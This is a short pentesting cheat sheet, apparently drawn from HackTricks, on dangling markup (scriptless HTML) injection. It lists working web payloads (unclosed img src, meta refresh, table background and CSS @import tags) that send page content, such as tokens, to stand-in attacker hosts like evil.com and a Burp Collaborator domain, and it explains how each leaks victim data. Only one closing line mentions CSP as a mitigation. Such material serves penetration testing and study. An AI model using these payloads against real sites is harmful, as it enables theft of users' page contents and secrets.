

# All the cases that apply Dangling Markup injection in XSS are useful to exploit

https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html

This technique can be use to extract information from a user when an HTML injection is found. This is very useful if you don't find any way to exploit a XSS but you can inject some HTML tags.

```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
<table background='//your-collaborator-id.burpcollaborator.net?'
<style>@import//hackvertor.co.uk?
<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />
```
If you inject `<img src='http://evil.com/log.cgi?` when the page is loaded the victim will send you all the code between the injected img tag and the next quote.

If the img tag is forbidden (due to CSP for example) you can also use `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`

You could also use `<table background='//your-collaborator-id.burpcollaborator.net?'`

You can also abuse CSS @import (will send all the code until it find a ";")

You can use Meta tag performing a redirect (in 5s in this case `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`. This can be mitigated with a CSP regarding http-equiv ( Content-Security-Policy: default-src 'self';, or Content-Security-Policy: http-equiv 'self';)